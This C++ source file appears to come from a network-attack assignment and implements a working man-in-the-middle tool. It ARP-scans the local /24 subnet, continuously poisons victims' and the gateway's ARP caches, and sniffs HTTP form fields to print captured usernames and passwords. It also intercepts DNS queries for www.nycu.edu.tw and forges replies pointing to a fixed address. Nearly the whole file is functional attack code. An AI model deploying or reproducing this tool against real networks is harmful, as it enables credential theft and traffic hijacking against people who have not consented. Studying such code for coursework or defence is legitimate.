#include "utils.hpp"

using namespace std;

int analyze_packet (char * data, int len, int type, struct need_info info){
    // type = 0: HTTP
    // type = 1: DNS
	
    if(type == 0){
        int c = 0, dport;
        int iph_len = (((uint8_t) data[0])&0x0F)<<2;
        int tcph_len = (((uint8_t) data[iph_len+12])&0xF0)>>2;
        dport = (((uint8_t)data[iph_len+2])<<8)|((uint8_t)data[iph_len+3]);
        if(dport == 80){
            string str = "", line, username = "", password = "";
            for (c = iph_len + tcph_len; c<len; c++) {
                str += data[c];
            }
            stringstream ss(str);
            while(getline(ss, line, '\n')){
                if(line.find("txtUsername=") != string::npos){
                    username = line.substr(line.find("txtUsername=") + 12, line.find('&') - line.find("txtUsername=") - 12);
                    password = line.substr(line.find("txtPassword=") + 12, line.find("\n"));
                    break;
                }
            }
            if(username != "" && password != ""){
                cout << "Username: " << username << '\n';
                cout << "Password: " << password << '\n';
            }
        }
    }
    else{
        // udp
        int dport;
        int iph_len = (((uint8_t) data[0])&0x0F)<<2, udph_len = 8;
        //sport = (((uint8_t)data[iph_len])<<8)|((uint8_t)data[iph_len+1]);
        dport = (((uint8_t)data[iph_len+2])<<8)|((uint8_t)data[iph_len+3]);
        
        if(dport == 53){
            string str = "";
            int dns_start = iph_len + udph_len;
            //struct dns_hdr *hdr = (struct dns_hdr *) (data + dns_start);

            int name_mv = dns_start + sizeof(dns_hdr);
            int qname_len = 5; //qry.type and qry.class, and final 0 in qname
            while(data[name_mv] != 0){
                int part_len = data[name_mv];
                qname_len += part_len + 1;
                //cout << "len: " << part_len << '\n';
                for(int j = 0; j < part_len; j++){
                    name_mv++;
                    str += data[name_mv];
                }
                name_mv++;
                str += '.';
            }

            if(str.find("www.nycu.edu.tw") != string::npos){
                send_dns_reply(data, len, qname_len, info);
                //cout << "Target found\n";

                return 1;
            }
        }
    }
    return 0;
}

void send_dns_reply(char *payload, int len, int qlen, struct need_info info){
    char *data = new char[1024];
    for(int i=0;i<len;i++){
        data[i] = payload[i];
    }

    // for revising ip header total length and checksum
    struct ip_hdr *iph = (struct ip_hdr *) data;
    int iph_len = (((uint8_t) data[0])&0x0F)<<2, udph_len = 8;
    iph->flags = 0;
    uint tmp = iph->src_ip;
    iph->src_ip = iph->dst_ip;
    iph->dst_ip = tmp;

    // for revising udp header length and checksum
    struct udp_hdr *udph = (struct udp_hdr *) (data + iph_len);
    udph->dst_port = udph->src_port;
    udph->src_port = htons(53);

    // for revising dns response content
    struct dns_hdr *new_hdr = (struct dns_hdr *) (data + iph_len + udph_len);

    new_hdr->flags = htons(0x8180);
    // only 1 answer in reply (140.113.24.241)
    new_hdr->ans_cnt = htons(1);
    new_hdr->authrr_cnt = htons(0);
    new_hdr->addrr_cnt = htons(0);

    int resp_mv = iph_len + udph_len + sizeof(struct dns_hdr) + qlen;
    struct resp_hdr *resp = (struct resp_hdr *) (data + resp_mv);
    resp->name = htons(0xc00c); // compress name
    resp->type = htons(1); // A record
    resp->cls = htons(1); // IN internet
    resp->ttl = htonl(5);
    resp->len = htons(4);
    resp_mv += sizeof(struct resp_hdr);
    data[resp_mv] = 140; data[resp_mv+1] = 113; 
    data[resp_mv+2] = 24; data[resp_mv+3] = 241;
    resp_mv += 4;

    // checksum calculation
    // reference: https://bruce690813.blogspot.com/2017/09/tcpip-checksum.html
    udph->len = htons(resp_mv - iph_len);
    udph->checksum = 0;
    // calculate udp checksum
    uint32_t sum = 0;
    // pseudo header
    sum += ntohs(iph->src_ip>>16) + ntohs(iph->src_ip&0xFFFF);
    sum += ntohs(iph->dst_ip>>16) + ntohs(iph->dst_ip&0xFFFF);
    sum += 0x0011; // UDP
    sum += (resp_mv - iph_len);
    auto buf = reinterpret_cast<const uint16_t*>(udph);
    int len_buf = (resp_mv - iph_len)%2 ? (resp_mv - iph_len)/2+1 : (resp_mv - iph_len)/2;
    for(int i = 0; i < len_buf; i++){
        sum += ntohs(buf[i]);
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    udph->checksum = ~htons(sum);

    // calculate ip checksum
    iph->tlen = htons(resp_mv);
    iph->checksum = 0;
    sum = 0;
    buf = reinterpret_cast<const uint16_t*>(iph);
    for(int i = 0; i < iph->ihl * 2; i++){
        sum += ntohs(buf[i] & 0xFFFF);
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    iph->checksum = ~htons(sum);

    // send data out
    send_data_udp(data, resp_mv, info);
}

void send_data_udp(char *data, int len, struct need_info info){
    //raw socket
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    // int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd < 0){
        perror("socket()");
        return;
    }

    uint32_t my_ip;
    int ifidx;
    unsigned char my_mac[6];
    get_if_info(info.ifname, &my_ip, my_mac, &ifidx);

    char *sendbuf = new char[1024];
    memset(sendbuf, 0, 1024);
    struct ethhdr *eth = (struct ethhdr *) sendbuf;
    string dest_ip;
    for(int i=0;i<4;i++){
        dest_ip += to_string((unsigned)data[16+i] & 0xFF);
        if(i != 3) dest_ip += '.';
    }
    memcpy(eth->h_source, my_mac, MAC_LENGTH);
    unsigned char *dest_mac = new unsigned char[6];
    str2mac(info.arp_table[dest_ip].c_str(), dest_mac);
    memcpy(eth->h_dest, dest_mac, MAC_LENGTH);
    eth->h_proto = htons(ETH_P_IP);

    for(int i=ETH2_HEADER_LEN;i<len+ETH2_HEADER_LEN;i++){
        sendbuf[i] = data[i-ETH2_HEADER_LEN];
    }

    // dump
    // for(int i=0;i<len+ETH2_HEADER_LEN;i++){
    //     cout << hex << (unsigned)sendbuf[i] << ' ';
    //     if(i%16 == 15) cout << '\n';
    // }
    // cout << '\n';


    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(struct sockaddr_ll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifidx;
    if (bind(fd, (struct sockaddr*) &sll, sizeof(struct sockaddr_ll)) < 0) {
        perror("bind");
    }

    struct sockaddr_ll socket_address;
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_IP);
    socket_address.sll_ifindex = ifidx;
    socket_address.sll_hatype = htons(ARPHRD_ETHER);
    socket_address.sll_pkttype = (PACKET_BROADCAST);
    socket_address.sll_halen = MAC_LENGTH;
    socket_address.sll_addr[6] = 0x00;
    socket_address.sll_addr[7] = 0x00;
    memcpy(socket_address.sll_addr, my_mac, MAC_LENGTH);

    if(sendto(fd, sendbuf, len+ETH2_HEADER_LEN, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0){
        perror("sendto()");
    }
    close(fd);
    delete[] sendbuf;
    delete[] data;

    return;
}

pair<uint,uint> print_pkt (struct nfq_data *tb, int type, struct need_info info) {
	uint id = 0, chk = 0;
	struct nfqnl_msg_packet_hdr *ph;
	int ret;
	char *data;

	ph = nfq_get_msg_packet_hdr(tb);
	if (ph) {
		id = ntohl(ph->packet_id);
	}
    
	ret = nfq_get_payload(tb, reinterpret_cast<unsigned char**>(&data));
	if (ret >= 0) {
		chk = analyze_packet (data, ret, type, info);
	}

	return make_pair(id, chk);
}
	

int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data){
	pair<uint,uint> pr = print_pkt(nfa, 0, *(struct need_info*)data);
	return nfq_set_verdict(qh, pr.first, NF_ACCEPT, 0, NULL);
}

int cb_dns(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data){
	pair<uint,uint> pr = print_pkt(nfa, 1, *(struct need_info*)data);

	if(pr.second) return nfq_set_verdict(qh, pr.first, NF_DROP, 0, NULL);
    else return nfq_set_verdict(qh, pr.first, NF_ACCEPT, 0, NULL);
}

void nfq_thread(int type, struct need_info info){
    struct nfq_handle *h;
	struct nfq_q_handle *qh;
	int fd;
	int rv;
	char buf[4096] __attribute__ ((aligned));

	//printf("opening library handle\n");
	h = nfq_open();
	if (!h) {
		fprintf(stderr, "error during nfq_open()\n");
		exit(1);
	}

	//printf("unbinding existing nf_queue handler for AF_INET (if any)\n");
	if (nfq_unbind_pf(h, AF_INET) < 0) {
		fprintf(stderr, "error during nfq_unbind_pf()\n");
		exit(1);
	}

	//printf("binding nfnetlink_queue as nf_queue handler for AF_INET\n");
	if (nfq_bind_pf(h, AF_INET) < 0) {
		fprintf(stderr, "error during nfq_bind_pf()\n");
		exit(1);
	}

	// printf("binding this socket to queue '0'\n");
	if(type==0) qh = nfq_create_queue(h, 0, &cb, (void*)&info);
    else {qh = nfq_create_queue(h, 0, &cb_dns, (void*)&info);}
	if (!qh) {
		fprintf(stderr, "error during nfq_create_queue()\n");
		exit(1);
	}

	// printf("setting copy_packet mode\n");
	if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
		fprintf(stderr, "can't set packet_copy mode\n");
		exit(1);
	}

	fd = nfq_fd(h);
	while ((rv = recv(fd, buf, sizeof(buf), 0))){
		nfq_handle_packet(h, buf, rv);
	}

	nfq_destroy_queue(qh);
	nfq_close(h);
	exit(0);
}

void str2mac(const char *txt, unsigned char *mac){
    sscanf(txt, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
    return;
}

/*
 * Converts struct sockaddr with an IPv4 address to network byte order uin32_t.
 * Returns 0 on success.
 */
int int_ip4(struct sockaddr *addr, uint32_t *ip)
{
    if (addr->sa_family == AF_INET) {
        struct sockaddr_in *i = (struct sockaddr_in *) addr;
        *ip = i->sin_addr.s_addr;
        return 0;
    } else {
        err("Not AF_INET");
        return 1;
    }
}

/*
 * Writes interface IPv4 address as network byte order to ip.
 * Returns 0 on success.
 */
int get_if_ip4(int fd, const char *ifname, uint32_t *ip) {
    int err = -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(struct ifreq));
    if (strlen(ifname) > (IFNAMSIZ - 1)) {
        err("Too long interface name");
        goto out;
    }

    strcpy(ifr.ifr_name, ifname);
    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
        perror("SIOCGIFADDR");
        goto out;
    }

    if (int_ip4(&ifr.ifr_addr, ip)) {
        goto out;
    }
    err = 0;
out:
    return err;
}

/*
 * Sends an ARP who-has request to dst_ip
 * on interface ifindex, using source mac src_mac and source ip src_ip.
 */
int send_arp(int fd, int ifindex, const unsigned char *src_mac, uint32_t src_ip, uint32_t dst_ip)
{
    int err = -1;
    unsigned char buffer[BUF_SIZE];
    memset(buffer, 0, sizeof(buffer));

    struct sockaddr_ll socket_address;
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = ifindex;
    socket_address.sll_hatype = htons(ARPHRD_ETHER);
    socket_address.sll_pkttype = (PACKET_BROADCAST);
    socket_address.sll_halen = MAC_LENGTH;
    socket_address.sll_addr[6] = 0x00;
    socket_address.sll_addr[7] = 0x00;

    struct ethhdr *send_req = (struct ethhdr *) buffer;
    struct arp_header *arp_req = (struct arp_header *) (buffer + ETH2_HEADER_LEN);
    //int index;
    ssize_t ret;

    //Broadcast
    memset(send_req->h_dest, 0xff, MAC_LENGTH);

    //Target MAC zero
    memset(arp_req->target_mac, 0x00, MAC_LENGTH);

    //Set source mac to our MAC address
    memcpy(send_req->h_source, src_mac, MAC_LENGTH);
    memcpy(arp_req->sender_mac, src_mac, MAC_LENGTH);
    memcpy(socket_address.sll_addr, src_mac, MAC_LENGTH);

    /* Setting protocol of the packet */
    // 0x0806 for ARP
    send_req->h_proto = htons(ETH_P_ARP);

    /* Creating ARP request */
    arp_req->htype = htons(HW_TYPE);
    arp_req->ptype = htons(ETH_P_IP);
    arp_req->hlen = MAC_LENGTH;
    arp_req->plen = IPV4_LENGTH;
    arp_req->opcode = htons(ARP_REQUEST);

    //debug("Copy IP address to arp_req");
    memcpy(arp_req->sender_ip, &src_ip, sizeof(uint32_t));
    memcpy(arp_req->target_ip, &dst_ip, sizeof(uint32_t));

    ret = sendto(fd, buffer, 42, 0, (struct sockaddr *) &socket_address, sizeof(socket_address));
    if (ret == -1) {
        perror("sendto():");
        goto out;
    }
    err = 0;
out:
    return err;
}

int arp_reply(int ifindex, unsigned char *src_mac, unsigned char *dst_mac, uint32_t src_ip, uint32_t dst_ip){
    int fd;
    bind_arp(ifindex, &fd);
    
    unsigned char buffer[BUF_SIZE];
    memset(buffer, 0, sizeof(buffer));

    struct sockaddr_ll socket_address;
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = ifindex;
    socket_address.sll_hatype = htons(ARPHRD_ETHER);
    socket_address.sll_pkttype = (PACKET_HOST);
    socket_address.sll_halen = MAC_LENGTH;
    socket_address.sll_addr[6] = 0x00;
    socket_address.sll_addr[7] = 0x00;

    struct ethhdr *send_req = (struct ethhdr *) buffer;
    struct arp_header *arp_req = (struct arp_header *) (buffer + ETH2_HEADER_LEN);
    ssize_t ret;

    //destination MAC
    memcpy(send_req->h_dest, dst_mac, MAC_LENGTH);
    memcpy(arp_req->target_mac, dst_mac, MAC_LENGTH);

    //Set source mac to our MAC address
    memcpy(send_req->h_source, src_mac, MAC_LENGTH);
    memcpy(arp_req->sender_mac, src_mac, MAC_LENGTH);
    memcpy(socket_address.sll_addr, src_mac, MAC_LENGTH);

    /* Setting protocol of the packet */
    // 0x0806 for ARP
    send_req->h_proto = htons(ETH_P_ARP);

    /* Creating ARP request */
    arp_req->htype = htons(HW_TYPE);
    arp_req->ptype = htons(ETH_P_IP);
    arp_req->hlen = MAC_LENGTH;
    arp_req->plen = IPV4_LENGTH;
    arp_req->opcode = htons(ARP_REPLY);

    //debug("Copy IP address to arp_req");
    memcpy(arp_req->sender_ip, &src_ip, sizeof(uint32_t));
    memcpy(arp_req->target_ip, &dst_ip, sizeof(uint32_t));

    ret = sendto(fd, buffer, 42, 0, (struct sockaddr *) &socket_address, sizeof(socket_address));
    close(fd);
    return ret;
}

void thread_reply(const char *ifname, vector<string> vctms, map<string, string> arp_table, unsigned char *gw_mac, uint32_t gw_ip){
    uint32_t my_ip;
    int ifidx;
    unsigned char my_mac[6];
    get_if_info(ifname, &my_ip, my_mac, &ifidx);

    while(true){
        unsigned char *vctm_mac = new unsigned char[6];
        for(uint i = 0; i < vctms.size(); i++){
            str2mac(arp_table[vctms[i]].c_str(), vctm_mac);
            // to victims
            arp_reply(ifidx, my_mac, vctm_mac, gw_ip, inet_addr(vctms[i].c_str()));
            // to gateway
            arp_reply(ifidx, my_mac, gw_mac, inet_addr(vctms[i].c_str()), gw_ip);
        }
        //free(vctm_mac);
        // sending every 500ms
        this_thread::sleep_for(chrono::milliseconds(500));
    }
}

/*
 * Gets interface information by name:
 * IPv4
 * MAC
 * ifindex
 */
int get_if_info(const char *ifname, uint32_t *ip, unsigned char *mac, int *ifindex)
{
    //debug("get_if_info for %s", ifname);
    int err = -1;
    struct ifreq ifr;
    int sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sd <= 0) {
        perror("socket()");
        goto out;
    }
    if (strlen(ifname) > (IFNAMSIZ - 1)) {
        printf("Too long interface name, MAX=%i\n", IFNAMSIZ - 1);
        goto out;
    }

    strcpy(ifr.ifr_name, ifname);

    //Get interface index using name
    if (ioctl(sd, SIOCGIFINDEX, &ifr) == -1) {
        perror("SIOCGIFINDEX");
        goto out;
    }
    *ifindex = ifr.ifr_ifindex;
    //printf("interface index is %d\n", *ifindex);

    //Get MAC address of the interface
    if (ioctl(sd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("SIOCGIFINDEX");
        goto out;
    }

    //Copy mac address to output
    memcpy(mac, ifr.ifr_hwaddr.sa_data, MAC_LENGTH);

    if (get_if_ip4(sd, ifname, ip)) {
        goto out;
    }
    //debug("get_if_info OK");

    err = 0;
out:
    if (sd > 0) {
        //debug("Clean up temporary socket");
        close(sd);
    }
    return err;
}


/*
 * Creates a raw socket that listens for ARP traffic on specific ifindex.
 * Writes out the socket's FD.
 * Return 0 on success.
 */
int bind_arp(int ifindex, int *fd)
{
    //debug("bind_arp: ifindex=%i", ifindex);
    int ret = -1;

    // Submit request for a raw socket descriptor.
    *fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (*fd < 1) {
        perror("socket()");
        goto out;
    }

    //debug("Binding to ifindex %i", ifindex);
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(struct sockaddr_ll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifindex;
    if (bind(*fd, (struct sockaddr*) &sll, sizeof(struct sockaddr_ll)) < 0) {
        perror("bind");
        goto out;
    }

    ret = 0;
out:
    if (ret && *fd > 0) {
        debug("Cleanup socket");
        close(*fd);
    }
    return ret;
}

/*
 * Reads a single ARP reply from fd.
 * Return 0 on success.
 */
int read_arp(int fd, map<string, string> &arp_table)
{
    //debug("read_arp");
    struct timeval timeout = {0, 300};
    if(setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout)) < 0){
        perror("setsockopt()");
        return -1;
    }

    int ret = -1;
    unsigned char buffer[BUF_SIZE];
    ssize_t length = recvfrom(fd, buffer, BUF_SIZE, 0, NULL, NULL);
    //int index;
    if (length == -1) {
        if (errno == EAGAIN || errno == EWOULDBLOCK) {
            return -50;
            //debug("Timeout");
            //goto out;
        }
        perror("recvfrom()");
        //goto out;
    }
    struct ethhdr *rcv_resp = (struct ethhdr *) buffer;
    struct arp_header *arp_resp = (struct arp_header *) (buffer + ETH2_HEADER_LEN);
    if (ntohs(rcv_resp->h_proto) != PROTO_ARP) {
        debug("Not an ARP packet");
        //goto out;
    }
    if (ntohs(arp_resp->opcode) != ARP_REPLY) {
        debug("Not an ARP reply");
        //goto out;
    }
    struct in_addr sender_a;
    memset(&sender_a, 0, sizeof(struct in_addr));
    memcpy(&sender_a.s_addr, arp_resp->sender_ip, sizeof(uint32_t));
    //debug("Sender IP: %s", inet_ntoa(sender_a));
    //cout << inet_ntoa(sender_a) << '\t';
    char dst_mac[18];
    sprintf(dst_mac, "%02X:%02X:%02X:%02X:%02X:%02X",
            arp_resp->sender_mac[0],
            arp_resp->sender_mac[1],
            arp_resp->sender_mac[2],
            arp_resp->sender_mac[3],
            arp_resp->sender_mac[4],
            arp_resp->sender_mac[5]);
    //cout << dst_mac << '\n';

    char *ip = inet_ntoa(sender_a);
    arp_table[ip] = dst_mac;

    ret = 0;

    return ret;
}

/*
 *
 * Sample code that sends an ARP who-has request on
 * interface <ifname> to IPv4 address <ip>.
 * Returns 0 on success.
 */
int test_arp(const char *ifname, uint32_t ip, map<string, string> &arp_table) {
    int ret = -1;
    uint32_t dst = ip;
    if (dst == 0 || dst == 0xffffffff) {
        printf("Invalid source IP\n");
        return 1;
    }

    uint32_t src;
    int ifindex;
    unsigned char mac[MAC_LENGTH];
    if (get_if_info(ifname, &src, mac, &ifindex)) {
        err("get_if_info failed, interface %s not found or no IP set?", ifname);
        goto out;
    }
    int arp_fd;
    if (bind_arp(ifindex, &arp_fd)) {
        err("Failed to bind_arp()");
        goto out;
    }

    for(int i=1;i<255;i++){
        // get subnet /24
        dst = dst & 0x00FFFFFF;
        dst = dst | (i << 24);
        // ignore myself
        if(src == dst) continue;
        if (send_arp(arp_fd, ifindex, mac, src, dst)) {
            err("Failed to send_arp");
            goto out;
        }
    }

    while(1) {
        int r = read_arp(arp_fd, arp_table);
        // if timeout
        if(r == -50){
            break;
        }
    }

    ret = 0;
out:
    if (arp_fd) {
        close(arp_fd);
        arp_fd = 0;
    }
    return ret;
}

